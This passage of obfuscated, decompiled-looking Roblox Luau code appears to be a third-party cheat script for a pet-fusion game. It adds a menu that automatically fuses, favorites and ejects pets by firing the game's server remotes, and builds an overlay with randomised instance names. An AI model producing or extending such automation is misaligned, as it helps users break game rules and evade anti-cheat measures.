local function fn51(arg)
return type(arg) == "table" and next(arg) ~= nil
end
fn45 = function(arg)
local n28 = tonumber(arg) or 0
local tbl50 = { "", "K", "M", "B", "T", "Qa", "Qi" }
local n29 = 1
while math.abs(n28) >= 1000 and n29 < #tbl50 do
n28 /= 1000
n29 += 1
end
return string.format(n29 == 1 and "$%.0f%s" or "$%.2f%s", n28, tbl50[n29])
end
fn46 = function(arg)
local fuseKernel = tbl.FuseKernel
if type(fuseKernel) ~= "table" or type(fuseKernel.PriceFor) ~= "function" then
return nil
end
local ok, result = pcall(fuseKernel.PriceFor, arg)
return ok and tonumber(result) or nil
end
local function fn52(arg, arg2, arg3)
local flag6 = type(arg2) == "table" and arg2.IsFavorite ~= true and not arg3[arg] and fn49(arg2.Category) <= n24 and (next(tbl48) == nil or tbl48[tostring(arg2.Category)] == true)
if flag6 then
flag6 = not (flag3 and fn51(arg2.Mutations))
end
if flag6 then
flag6 = (tbl49[arg] or 0) <= os.clock()
end
return flag6
end
fn47 = function(arg)
local inventory = type(arg.Inventory) == "table" and arg.Inventory or {}
local tbl50 = {}
local v27 = pairs
local equippedAssets = arg.EquippedAssets or {}
for _, equippedAsset in v27(equippedAssets) do
tbl50[equippedAsset] = true
end
local tbl51 = {}
local tbl52 = {}
for i = 1, 3 do
local flag6 = type(arg.FusionSlots) == "table" and arg.FusionSlots[i] or nil
if flag6 ~= nil and type(inventory[flag6]) == "table" then
table.insert(tbl51, flag6)
tbl52[flag6] = true
end
end
local tbl53 = {}
for k, v28 in pairs(inventory) do
if not tbl52[k] and type(v28) == "table" and v28.InFuse ~= true and fn52(k, v28, tbl50) then
local str4 = tostring(v28.Category)
tbl53[str4] = tbl53[str4] or {}
table.insert(tbl53[str4], { Uid = k, Item = v28, Income = fn50(v28) })
end
end
local function fn53(arg2)
table.sort(arg2, function(arg3, arg4)
if arg3.Income ~= arg4.Income then
if v26 == tbl43[2] then
return arg3.Income > arg4.Income
end
return arg3.Income < arg4.Income
end
return tostring(arg3.Uid) < tostring(arg4.Uid)
end)
end
if #tbl51 > 0 then
local str4 = tostring(inventory[tbl51[1]].Category)
local flag6 = true
for _, v28 in ipairs(tbl51) do
local v29 = inventory[v28]
if tostring(v29.Category) ~= str4 or not fn52(v28, v29, tbl50) then
flag6 = false
end
end
local tbl54 = tbl53[str4] or {}
if flag6 and #tbl51 + #tbl54 >= 3 then
fn53(tbl54)
local tbl55 = { Category = str4, Load = {}, Items = {} }
for _, v28 in ipairs(tbl51) do
table.insert(tbl55.Items, inventory[v28])
end
for i = 1, 3 - #tbl51 do
table.insert(tbl55.Load, tbl54[i].Uid)
table.insert(tbl55.Items, tbl54[i].Item)
end
return tbl55
end
if flag4 then
return { Category = str4, Eject = tbl51 }
end
return nil, "Machine holds pets that cannot finish a fuse"
end
local v28 = nil
local v29 = nil
for k, v30 in pairs(tbl53) do
if #v30 >= 3 then
local v31 = fn49(k)
local n28 = 0
for _, v32 in ipairs(v30) do
n28 += v32.Income
end
local tbl54
if v25 == tbl42[2] then
tbl54 = { -v31, -#v30 }
elseif v25 == tbl42[3] then
tbl54 = { -#v30, v31 }
elseif v25 == tbl42[4] then
tbl54 = { n28 / #v30, v31 }
else
tbl54 = { v31, -#v30 }
end
if v28 == nil or tbl54[1] < v28[1] or tbl54[1] == v28[1] and (tbl54[2] < v28[2] or tbl54[2] == v28[2] and k < v29) then
v28 = tbl54
v29 = k
end
end
end
if not v29 then
return nil, "No three matching pets"
end
local v30 = tbl53[v29]
fn53(v30)
local tbl54 = { Category = v29, Load = {}, Items = {} }
for i = 1, 3 do
table.insert(tbl54.Load, v30[i].Uid)
table.insert(tbl54.Items, v30[i].Item)
end
return tbl54
end
end
local function fn48(arg)
local v27 = fn43()
if not v27 then
return
end
if v27.FusionLocked == true then
if type(v27.FusionEggReward) == "table" and os.clock() >= n27 then
n27 = os.clock() + n22
fn42("RF/Fusery/FinishReveal")
end
return
end
local v28 = fn47(v27)
if not v28 then
return
end
if v28.Eject then
for _, v29 in ipairs(v28.Eject) do
if arg ~= n25 then
return
end
fn42("RF/Fusery/EjectPet", v29)
task.wait(0.35)
end
return
end
local v29 = fn46(v28.Items)
local num = tonumber(v27.Money)
if v29 and num and num < v29 then
return
end
for _, v30 in ipairs(v28.Load) do
if arg ~= n25 then
return
end
local LoadPet, v31 = fn42("RF/Fusery/LoadPet", v30)
if not LoadPet or v31 == false then
tbl49[v30] = os.clock() + n23
return
end
task.wait(0.35)
end
if arg ~= n25 then
return
end
local BeginFuse, v30 = fn42("RF/Fusery/BeginFuse")
if BeginFuse and v30 ~= false then
n27 = os.clock() + n22
end
end
local function fn49(arg)
if not arg then
return "Fuse status unknown"
end
if arg.FusionLocked == true then
return "Machine is fusing, waiting for the egg"
end
local v27, v28 = fn47(arg)
if not v27 then
return v28 or "No three matching pets"
end
if v27.Eject then
return string.format("Would eject %d %s that cannot finish a fuse", #v27.Eject, fn44(v27.Category))
end
local v29 = fn46(v27.Items)
local num = tonumber(arg.Money)
local str4 = v29 and num and num < v29 and "  (not enough money)" or ""
return string.format("Next fuse  -  3 %s for %s%s", fn44(v27.Category), v29 and fn45(v29) or "?", str4)
end
tbl3.Add(function()
local v27 = fn43()
if v24 and type(v24.Set) == "function" then
pcall(v24.Set, v24, fn49(v27))
end
if not tbl4.Toggle(v23, false) or flag5 or os.clock() < n26 then
return false
end
flag5 = true
n26 = os.clock() + n21
local v28 = n25
task.spawn(function()
pcall(fn48, v28)
flag5 = false
tbl3.Wake()
end)
return false
end)
v24 = v14:CreateText({ Name = "Fuse Preview", Text = "Fuse status unknown" })
v23 = v14:CreateToggle({
Name = "Auto Fuse Machine",
Note = "Fuse 3 same pets into an egg, nonstop",
Default = false,
Callback = function()
n25 += 1
table.clear(tbl49)
n26 = 0
tbl3.Wake()
end,
})
v14:CreateDropdown({
Name = "Fuse Priority Mode",
Options = tbl42,
Default = tbl42[1],
SubOf = v23,
Callback = function(arg)
if table.find(tbl42, arg) then
v25 = arg
tbl3.Wake()
end
end,
})
v14:CreateDropdown({
Name = "Pets To Use",
Options = tbl43,
Default = tbl43[1],
SubOf = v23,
Callback = function(arg)
if table.find(tbl43, arg) then
v26 = arg
tbl3.Wake()
end
end,
})
v14:CreateDropdown({
Name = "Max Rarity to Fuse",
Options = tbl44,
Default = fn41(6),
SubOf = v23,
Callback = function(arg)
n24 = tbl45[arg] or n24
tbl3.Wake()
end,
})
fn6(v14:CreateMultiDropdown({
Name = "Specific Species to Fuse",
Note = "Only fuse these species (empty = all)",
Options = tbl46,
Default = {},
SubOf = v23,
Callback = function(arg)
local tbl50 = {}
if type(arg) == "table" then
for k, v27 in pairs(arg) do
k = v27 == true and type(k) == "string" and k or type(v27) == "string" and v27 or nil
if k and tbl47[k] then
tbl50[tbl47[k]] = true
end
end
end
tbl48 = tbl50
tbl3.Wake()
end,
}))
local v27 = nil
v27 = v14:CreateToggle({
Name = "Skip Mutated Pets",
Default = true,
SubOf = v23,
Callback = function()
flag3 = tbl4.Toggle(v27, true)
tbl3.Wake()
end,
})
local v28 = nil
v28 = v14:CreateToggle({
Name = "Eject Incomplete Slots",
Note = "Take out pets that can't make a set",
Default = true,
SubOf = v23,
Callback = function()
flag4 = tbl4.Toggle(v28, true)
tbl3.Wake()
end,
})
end
local save4 = tbl.Save
if type(save4) == "table" and type(save4.FieldSignal) == "function" then
for _, v24 in ipairs({
"Inventory",
"EquippedAssets",
"FusionSlots",
"FusionLocked",
"FusionEggReward",
"Money",
}) do
local ok, result = pcall(save4.FieldSignal, v24)
if ok and type(result) == "table" and type(result.Connect) == "function" then
local ok2, result2 = pcall(result.Connect, result, function()
tbl3.Wake()
end)
if ok2 and result2 then
fn4(function()
pcall(function()
result2:Disconnect()
end)
end)
end
end
end
end
n2 = 2
n3 = 25
n4 = 4
tbl15 = { "Match Any", "Match All" }
do
local tbl48 = { "Golden", "Silver", "Rainbow", "Boss", "Monstrous", "Sakura", "GreatBloom" }
str = "Any Mutation"
tbl16 = { "Off" }
tbl17 = {}
tbl18 = {}
tbl19 = {}
tbl20 = { "Any Mutation" }
tbl21 = {}
local directory = tbl.Assets and tbl.Assets.Directory
local tbl49 = {}
local tbl50 = {}
if type(directory) == "table" then
for k, v24 in pairs(directory) do
local rarity = type(v24) == "table" and v24.Rarity or nil
local flag3 = type(rarity) == "table"
local num
if flag3 then
num = tonumber(rarity.RarityNumber or rarity.Rank)
else
num = flag3
end
num = num or nil
if num then
local str4 = tostring(rarity.DisplayName or rarity._id or num)
tbl49[num] = tbl49[num] or str4
table.insert(tbl50, {
Category = tostring(k),
Name = tostring(v24.DisplayName or k),
Rarity = num,
RarityName = str4,
})
end
end
end
local tbl51 = {}
for k in pairs(tbl49) do
table.insert(tbl51, k)
end
table.sort(tbl51)
for _, v24 in ipairs(tbl51) do
local str4 = string.format("%d - %s", v24, tbl49[v24])
table.insert(tbl16, str4)
tbl17[str4] = v24
end
table.sort(tbl50, function(arg, arg2)
if arg.Rarity ~= arg2.Rarity then
return arg.Rarity < arg2.Rarity
end
return arg.Name < arg2.Name
end)
for _, v24 in ipairs(tbl50) do
local str4 = string.format("%s [%s]", v24.Name, v24.RarityName)
if tbl19[str4] then
str4 = string.format("%s [%s] (%s)", v24.Name, v24.RarityName, v24.Category)
end
table.insert(tbl18, str4)
tbl19[str4] = v24.Category
end
local tbl52 = {}
local mutations = tbl.Mutations
if type(mutations) == "table" and type(mutations.IdSet) == "table" then
for k in pairs(mutations.IdSet) do
table.insert(tbl52, tostring(k))
end
end
if #tbl52 == 0 then
tbl52 = table.clone(tbl48)
end
table.sort(tbl52, function(arg, arg2)
return fn7(arg) < fn7(arg2)
end)
for _, v24 in ipairs(tbl52) do
local v25 = fn7(v24)
table.insert(tbl20, v25)
tbl21[v25] = v24
end
end
end
do
local v9 = nil
local v10 = nil
local v11 = nil
local createText = nil
local v12 = tbl15[2]
local v13 = nil
local flag = false
local tbl22 = {}
local n5 = 0
local tbl23 = {}
local flag2 = false
local n6 = 0
local tbl24 = {}
local function fn8()
local save = tbl.Save
if type(save) ~= "table" or type(save.Get) ~= "function" then
return nil
end
local ok, result = pcall(save.Get)
return ok and type(result) == "table" and result or nil
end
local function fn9(arg)
local directory = tbl.Assets and tbl.Assets.Directory
return type(directory) == "table" and directory[tostring(arg)] or nil
end
local function fn10(arg)
local v14 = fn9(arg)
local rarity = type(v14) == "table" and v14.Rarity or nil
local flag3 = type(rarity) == "table"
if flag3 then
flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
end
return flag3 or 0
end
local function fn11(arg)
local v14 = fn9(arg.Category)
local n7 = type(v14) == "table" and tonumber(v14.EarningRate) or 0
local n8 = tonumber(arg.Scale) or 0
if n7 <= 0 or n8 <= 0 then
return 0
end
local n9 = n8 > 5 and (n8 / 5) ^ 1.2 * 19.637875755794113 or n8 ^ 1.85
local mutations = tbl.Mutations
local flag3 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
local n10 = 1
if flag3 then
local ok
ok, n10 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
ok = ok and type(n10) == "number"
local n11 = 1
if not ok then
n10 = n11
end
end
return n7 * n9 * n10
end
local function fn12(arg)
local tbl25 = {}
if type(arg.Mutations) == "table" then
for k, mutation in pairs(arg.Mutations) do
if type(mutation) == "string" then
tbl25[mutation] = true
elseif mutation == true and type(k) == "string" then
tbl25[k] = true
end
end
end
if type(arg.BaseMutation) == "string" and arg.BaseMutation ~= "" then
tbl25[arg.BaseMutation] = true
end
return tbl25
end
local function fn13(arg)
if tbl23[tostring(arg.Category)] then
return true
end
local n7 = 0
local n8 = 0
if v13 then
n7 = 1
if v13 <= fn10(arg.Category) then
n8 = 1
end
end
if flag or next(tbl22) ~= nil then
n7 += 1
local v14 = fn12(arg)
if flag and next(v14) ~= nil then
n8 += 1
else
local flag3 = false
for k in pairs(v14) do
if tbl22[k] then
flag3 = true
break
end
end
if flag3 then
n8 += 1
end
end
end
if n5 > 0 then
n7 += 1
if fn11(arg) >= n5 then
n8 += 1
end
end
if n7 == 0 then
return false
end
if v12 == tbl15[2] then
return n8 == n7
end
return n8 > 0
end
local function fn14(arg)
return (tbl24[arg] or 0) > os.clock()
end
local function fn15(arg)
local tbl25 = {}
local v14, v15, v16 = pairs(arg.Inventory or {})
local n7 = 0
for k, v17 in v14, v15, v16 do
if type(v17) == "table" and fn13(v17) then
n7 += 1
if v17.IsFavorite ~= true and not fn14(k) then
table.insert(tbl25, k)
end
end
end
return tbl25, n7
end
local function fn16(arg, arg2, arg3)
local tbl25 = {}
local inventory = arg.Inventory or {}
local v14 = pairs
local equippedAssets = arg.EquippedAssets or {}
for _, equippedAsset in v14(equippedAssets) do
local v15 = inventory[equippedAsset]
if type(v15) == "table" and not fn14(equippedAsset) then
if arg2 then
if v15.IsFavorite ~= true then
table.insert(tbl25, equippedAsset)
end
else
local flag3 = v15.IsFavorite == true
if flag3 then
flag3 = not (arg3 and fn13(v15))
end
if flag3 then
table.insert(tbl25, equippedAsset)
end
end
end
end
return tbl25
end
local function fn17(arg, arg2)
local rePetSatchelWriteFavourite = networking:FindFirstChild("RE/PetSatchel/WriteFavourite")
if not rePetSatchelWriteFavourite or not rePetSatchelWriteFavourite:IsA("RemoteEvent") then
return
end
for i, v14 in ipairs(arg) do
if not (n3 < i) then
tbl24[v14] = os.clock() + n4
pcall(rePetSatchelWriteFavourite.FireServer, rePetSatchelWriteFavourite, v14, arg2)
task.wait(0.12)
continue
end
break
end
end
local function fn18(arg, arg2)
local v14 = flag2
local flag3
if flag2 then
flag3 = v14
else
flag3 = #arg == 0
end
if flag3 then
return false
end
flag2 = true
n6 = os.clock() + n2
task.spawn(function()
pcall(fn17, arg, arg2)
flag2 = false
tbl3.Wake()
end)
return true
end
tbl3.Add(function()
local v14 = fn8()
if not v14 then
return false
end
local v15 = tbl4.Toggle(v9, false)
local v16, v17 = fn15(v14)
if createText and type(createText.Set) == "function" then
local v18 = pairs
local inventory = v14.Inventory or {}
local n7 = 0
for _, v19 in v18(inventory) do
if type(v19) == "table" and v19.IsFavorite == true then
n7 += 1
end
end
pcall(createText.Set, createText, string.format("Favorite matches  -  %d pets, %d to mark  |  %d favorited", v17, #v16, n7))
end
if flag2 or os.clock() < n6 then
return false
end
if v15 and fn18(v16, true) then
return false
end
if tbl4.Toggle(v10, false) then
if fn18(fn16(v14, true, false), true) then
return false
end
elseif tbl4.Toggle(v11, false) then
fn18(fn16(v14, false, v15), false)
end
return false
end)
createText = v8.CreateText
createText = createText(v8, { Name = "Favorite Preview", Text = "Favorite matches  -  0 pets" })
v9 = v8:CreateToggle({
Name = "Auto Favorite Pet",
Note = "Favorite pets matching the rules below",
Default = false,
Callback = function()
table.clear(tbl24)
tbl3.Wake()
end,
})
v8:CreateButton({
Name = "Favorite Pets Now",
Note = "Favorite matching pets once",
ButtonText = "Favorite",
ConfirmText = "Done!",
SubOf = v9,
Callback = function()
local v14 = fn8()
if v14 then
fn18(fn15(v14), true)
end
end,
})
v8:CreateDropdown({
Name = "Favorite Rule",
Note = "Pass any check or all checks",
Options = tbl15,
Default = tbl15[2],
SubOf = v9,
Callback = function(arg)
if table.find(tbl15, arg) then
v12 = arg
tbl3.Wake()
end
end,
})
v8:CreateDropdown({
Name = "Favorite Min Rarity",
Note = "Favorite pets of the chosen rarity and every rarity above it (Off = skip)",
Options = tbl16,
Default = "Off",
SubOf = v9,
Callback = function(arg)
v13 = tbl17[arg]
tbl3.Wake()
end,
})
fn6(v8:CreateMultiDropdown({
Name = "Favorite Mutations",
Note = "Mutation check (empty = skip)",
Options = tbl20,
Default = {},
SubOf = v9,
Callback = function(arg)
local tbl25 = {}
local flag3 = false
if type(arg) == "table" then
for k, v14 in pairs(arg) do
k = v14 == true and type(k) == "string" and k
if k then
v14 = k
else
v14 = type(v14) == "string" and v14
end
v14 = v14 or nil
if v14 == str then
flag3 = true
elseif v14 then
v14 = tbl21[v14] or v14
tbl25[v14] = true
end
end
end
flag = flag3
tbl22 = tbl25
tbl3.Wake()
end,
}))
local tbl25 = {
["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
}
local n7 = 0
local str2 = "M/s"
local function fn19(arg, arg2)
if arg ~= nil then
n7 = math.max(0, math.floor(tonumber(arg) or n7))
end
if arg2 ~= nil then
str2 = tostring(arg2)
end
n5 = n7 * (tbl25[str2] or tbl25["M/s"]).Mult
tbl3.Wake()
end
fn5(v8, {
Name = "Min Favorite Value",
Note = "Value check (0 = skip)",
SubOf = v9,
Legacy = "Favorite Min Value",
SectionName = "Auto Favorite",
OnRaw = function(arg)
fn19(math.floor(arg / 1000), "K/s")
end,
})
fn6(v8:CreateMultiDropdown({
Name = "Always Favorite Species",
Note = "Always favorite these species",
Options = tbl18,
Default = {},
SubOf = v9,
Callback = function(arg)
local tbl26 = {}
if type(arg) == "table" then
for k, v14 in pairs(arg) do
k = v14 == true and type(k) == "string" and k or type(v14) == "string" and v14
local v15 = k or nil
if v15 and tbl19[v15] then
tbl26[tbl19[v15]] = true
end
end
end
tbl23 = tbl26
tbl3.Wake()
end,
}))
v10 = v8:CreateToggle({
Name = "Auto Favorite Equipped",
Note = "Keep equipped pets favorited",
Default = false,
Callback = function()
tbl3.Wake()
end,
})
v11 = v8:CreateToggle({
Name = "Auto Unfavorite Equipped",
Note = "Unfavorite equipped pets not in the rules",
Default = false,
Callback = function()
tbl3.Wake()
end,
})
v8:CreateButton({
Name = "Favorite Equipped Now",
Note = "Favorite all equipped pets once",
ButtonText = "Favorite",
ConfirmText = "Done!",
Callback = function()
local v14 = fn8()
if v14 then
fn18(fn16(v14, true, false), true)
end
end,
})
v8:CreateButton({
Name = "Unfavorite Equipped Now",
Note = "Unfavorite all equipped pets once",
ButtonText = "Unfavorite",
ConfirmText = "Done!",
Callback = function()
local v14 = fn8()
if v14 then
fn18(fn16(v14, false, false), false)
end
end,
})
end
local save = tbl.Save
if type(save) == "table" and type(save.FieldSignal) == "function" then
for _, v9 in ipairs({ "Inventory", "EquippedAssets" }) do
local ok, result = pcall(save.FieldSignal, v9)
if ok and type(result) == "table" and type(result.Connect) == "function" then
local ok2, result2 = pcall(result.Connect, result, function()
tbl3.Wake()
end)
if ok2 and result2 then
fn4(function()
pcall(function()
result2:Disconnect()
end)
end)
end
end
end
end
local function fn8()
local tbl22 = {}
local function fn9(arg)
local v9 = tbl22[arg]
if type(v9) ~= "string" then
return ""
end
return v9
end
local function fn10(arg, text)
arg.AutoLocalize = false
arg.Text = text
end
local n5 = 0
local tbl23 = nil
local function fn11()
if not tbl23 then
return
end
for _, v9 in ipairs(tbl23) do
fn10(v9[1], fn9(v9[2]))
end
end
local connection = UserInputService.InputBegan:Connect(function(input)
local userInputType = input.UserInputType
if userInputType == Enum.UserInputType.MouseButton1 or userInputType == Enum.UserInputType.Touch or userInputType == Enum.UserInputType.Keyboard or userInputType == Enum.UserInputType.Gamepad1 then
n5 = os.clock()
end
end)
fn4(function()
pcall(function()
connection:Disconnect()
end)
end)
local function fn12()
return os.clock() - n5 <= 1
end
local screenGui = nil
local uiScale = nil
local tbl24 = {}
local fn13 = nil
local fn14 = nil
local function fn15()
if not uiScale then
return
end
local currentCamera = workspace.CurrentCamera
currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)
if currentCamera.X < 1 then
currentCamera = Vector2.new(1280, 720)
end
uiScale.Scale = math.clamp(math.min(currentCamera.X / 1280, currentCamera.Y / 720), 0.72, 1.35)
end
local function fn16()
if screenGui then
screenGui.Enabled = false
end
end
local font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
local colorSequence = ColorSequence.new
local tbl25 = {}
local v9 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))
local v10 = ColorSequenceKeypoint.new(0.486, Color3.fromRGB(255, 255, 255))
local v11 = ColorSequenceKeypoint.new(0.519, Color3.fromRGB(221, 221, 221))
local new = ColorSequenceKeypoint.new
local color = Color3.fromRGB
tbl25[1] = v9
tbl25[2] = v10
tbl25[3] = v11
do
local values = table.pack(new(1, color(236, 236, 236)))
table.move(values, 1, values.n, 4, tbl25)
end
local v12 = colorSequence(tbl25)
local new2 = ColorSequenceKeypoint.new
local color2 = Color3.fromRGB
local colorSequence2 = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 36, 84)), new2(1, color2(0, 31, 54)) })
local colorSequence3 = ColorSequence.new
local tbl26 = {}
local v13 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 193, 194))
local v14 = ColorSequenceKeypoint.new(0.057, Color3.fromRGB(255, 132, 123))
local new3 = ColorSequenceKeypoint.new
local color3 = Color3.fromRGB
tbl26[1] = v13
tbl26[2] = v14
do
local values = table.pack(new3(1, color3(239, 28, 28)))
table.move(values, 1, values.n, 3, tbl26)
end
local v15 = colorSequence3(tbl26)
local colorSequence4 = ColorSequence.new
local tbl27 = {}
local v16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 193, 194))
local v17 = ColorSequenceKeypoint.new(0.015, Color3.fromRGB(255, 132, 123))
local new4 = ColorSequenceKeypoint.new
local color4 = Color3.fromRGB
tbl27[1] = v16
tbl27[2] = v17
do
local values = table.pack(new4(1, color4(239, 28, 28)))
table.move(values, 1, values.n, 3, tbl27)
end
local v18 = colorSequence4(tbl27)
local colorSequence5 = ColorSequence.new
local tbl28 = {}
local v19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(92, 94, 106))
local v20 = ColorSequenceKeypoint.new(0.057, Color3.fromRGB(70, 71, 82))
local new5 = ColorSequenceKeypoint.new
local color5 = Color3.fromRGB
tbl28[1] = v19
tbl28[2] = v20
do
local values = table.pack(new5(1, color5(38, 39, 46)))
table.move(values, 1, values.n, 3, tbl28)
end
local v21 = colorSequence5(tbl28)
local function createUIStroke(parent, applyStrokeMode, thickness, color6)
local uiStroke = Instance.new("UIStroke")
uiStroke.Name = fn3()
uiStroke.ApplyStrokeMode = applyStrokeMode
uiStroke.Color = color6 or Color3.fromRGB(0, 0, 0)
uiStroke.LineJoinMode = Enum.LineJoinMode.Round
uiStroke.Thickness = thickness
uiStroke.Transparency = 0
uiStroke.Parent = parent
return uiStroke
end
local function createUIGradient(parent, color6, rotation)
local uiGradient = Instance.new("UIGradient")
uiGradient.Name = fn3()
uiGradient.Color = color6
uiGradient.Rotation = rotation or 90
uiGradient.Parent = parent
return uiGradient
end
local function createUIStroke2(parent, textSize)
parent.FontFace = font
parent.TextColor3 = Color3.fromRGB(255, 255, 255)
parent.TextStrokeTransparency = 1
parent.TextSize = textSize
parent.LineHeight = 1
local uiStroke = Instance.new("UIStroke")
uiStroke.Name = fn3()
uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
uiStroke.Color = Color3.fromRGB(0, 0, 0)
uiStroke.LineJoinMode = Enum.LineJoinMode.Round
uiStroke.Thickness = math.max(1, textSize * 0.08)
uiStroke.Transparency = 0
uiStroke.Parent = parent
return uiStroke
end
local function fn17(arg, arg2)
local v22 = createUIStroke2(arg, arg2)
createUIGradient(v22, colorSequence2, 90)
createUIGradient(arg, v12, 90)
v22.Thickness = math.max(1, arg2 * 0.065)
end
local function fn18()
if screenGui then
return
end
screenGui = Instance.new("ScreenGui")
screenGui.Name = fn3()
screenGui.DisplayOrder = 2e9
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Enabled = false
local textButton = Instance.new("TextButton")
textButton.Name = fn3()
textButton.AutoButtonColor = false
textButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textButton.BackgroundTransparency = 0.255
textButton.BorderSizePixel = 0
textButton.Modal = true
textButton.Size = UDim2.fromScale(1, 1)
textButton.Text = ""
textButton.ZIndex = 1
textButton.Parent = screenGui
local frame = Instance.new("Frame")
frame.Name = fn3()
frame.Active = true
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BackgroundTransparency = 0.18
frame.Position = UDim2.fromScale(0.5, 0.5)
frame.Size = UDim2.fromOffset(430, 316)
frame.ZIndex = 10
frame.Parent = screenGui
uiScale = Instance.new("UIScale")
uiScale.Name = fn3()
uiScale.Parent = frame
createUIStroke(frame, Enum.ApplyStrokeMode.Border, 2)
local frame2 = Instance.new("Frame")
frame2.Name = fn3()
frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame2.BorderSizePixel = 0
frame2.Position = UDim2.fromOffset(22, 22)
frame2.Size = UDim2.fromOffset(5, 26)
frame2.ZIndex = 12
frame2.Parent = frame
createUIGradient(frame2, v15, 90)
createUIStroke(frame2, Enum.ApplyStrokeMode.Border, 1.4)
local textLabel = Instance.new("TextLabel")
textLabel.Name = fn3()
textLabel.BackgroundTransparency = 1
textLabel.Position = UDim2.fromOffset(38, 20)
textLabel.Size = UDim2.fromOffset(370, 30)
textLabel.TextXAlignment = Enum.TextXAlignment.Left
textLabel.TextYAlignment = Enum.TextYAlignment.Center
textLabel.ZIndex = 12
textLabel.Parent = frame
fn17(textLabel, 21)
fn10(textLabel, fn9("Title"))
local frame3 = Instance.new("Frame")
frame3.Name = fn3()
frame3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame3.BackgroundTransparency = 0.82
frame3.BorderSizePixel = 0
frame3.Position = UDim2.fromOffset(22, 58)
frame3.Size = UDim2.fromOffset(386, 1)
frame3.ZIndex = 12
frame3.Parent = frame
local textLabel2 = Instance.new("TextLabel")
textLabel2.Name = fn3()
textLabel2.BackgroundTransparency = 1
textLabel2.Position = UDim2.fromOffset(22, 68)
textLabel2.Size = UDim2.fromOffset(386, 24)
textLabel2.TextXAlignment = Enum.TextXAlignment.Left
textLabel2.TextYAlignment = Enum.TextYAlignment.Center
textLabel2.ZIndex = 12
textLabel2.Parent = frame
createUIStroke2(textLabel2, 17)
textLabel2.TextColor3 = Color3.fromRGB(255, 72, 72)
createUIGradient(textLabel2, ColorSequence.new(Color3.fromRGB(255, 132, 123), Color3.fromRGB(239, 28, 28)), 90)
fn10(textLabel2, fn9("Warn"))
local textLabel3 = Instance.new("TextLabel")
textLabel3.Name = fn3()
textLabel3.BackgroundTransparency = 1
textLabel3.Position = UDim2.fromOffset(22, 98)
textLabel3.Size = UDim2.fromOffset(386, 74)
textLabel3.TextWrapped = true
textLabel3.TextXAlignment = Enum.TextXAlignment.Left
textLabel3.TextYAlignment = Enum.TextYAlignment.Top
textLabel3.ZIndex = 12
textLabel3.Parent = frame
createUIStroke2(textLabel3, 15)
textLabel3.LineHeight = 1.14
textLabel3.TextTransparency = 0.12
fn10(textLabel3, fn9("Body"))
local textLabel4 = Instance.new("TextLabel")
textLabel4.Name = fn3()
textLabel4.BackgroundTransparency = 1
textLabel4.Position = UDim2.fromOffset(22, 176)
textLabel4.Size = UDim2.fromOffset(386, 46)
textLabel4.TextWrapped = true
textLabel4.TextXAlignment = Enum.TextXAlignment.Left
textLabel4.TextYAlignment = Enum.TextYAlignment.Top
textLabel4.ZIndex = 12
textLabel4.Parent = frame
createUIStroke2(textLabel4, 14)
textLabel4.LineHeight = 1.12
textLabel4.TextColor3 = Color3.fromRGB(255, 176, 120)
fn10(textLabel4, fn9("Tip"))
local function fn19(arg, arg2, arg3)
local textButton2 = Instance.new("TextButton")
textButton2.Name = fn3()
textButton2.Active = true
textButton2.AutoButtonColor = false
textButton2.BackgroundTransparency = 1
textButton2.BorderSizePixel = 0
textButton2.Position = UDim2.fromOffset(arg, 244)
textButton2.Size = UDim2.fromOffset(arg2, 46)
textButton2.Text = ""
textButton2.ZIndex = 14
textButton2.Parent = frame
local frame4 = Instance.new("Frame")
frame4.Name = fn3()
frame4.AnchorPoint = Vector2.new(0.5, 0.5)
frame4.BackgroundColor3 = arg3 and Color3.fromRGB(175, 0, 0) or Color3.fromRGB(24, 25, 30)
frame4.BorderSizePixel = 0
frame4.Position = UDim2.fromScale(0.5, 0.5)
frame4.Size = UDim2.fromScale(1, 0.92)
frame4.ZIndex = 12
frame4.Parent = textButton2
createUIStroke(frame4, Enum.ApplyStrokeMode.Border, 1.6)
local frame5 = Instance.new("Frame")
frame5.Name = fn3()
frame5.AnchorPoint = Vector2.new(0.5, 0)
frame5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame5.BorderSizePixel = 0
frame5.Position = UDim2.fromScale(0.5, 0)
frame5.Size = UDim2.fromScale(1, 0.9)
frame5.ZIndex = 12
frame5.Parent = frame4
createUIGradient(frame5, arg3 and v15 or v21, 90)
local frame6 = Instance.new("Frame")
frame6.Name = fn3()
frame6.AnchorPoint = Vector2.new(0.5, 0.5)
frame6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame6.BorderSizePixel = 0
frame6.Position = UDim2.fromScale(0.5, 0.5)
frame6.Size = UDim2.fromScale(0.965, 0.88)
frame6.ZIndex = 13
frame6.Parent = frame5
createUIGradient(frame6, arg3 and v18 or v21, 90)
local textLabel5 = Instance.new("TextLabel")
textLabel5.Name = fn3()
textLabel5.AnchorPoint = Vector2.new(0.5, 0.5)
textLabel5.BackgroundTransparency = 1
textLabel5.Position = UDim2.fromScale(0.5, 0.5)
textLabel5.Size = UDim2.fromScale(0.9, 0.6)
textLabel5.TextWrapped = true
textLabel5.ZIndex = 15
textLabel5.Parent = textButton2
fn17(textLabel5, 17)
return textButton2, textLabel5
end
local v22, v23 = fn19(22, 184, false)
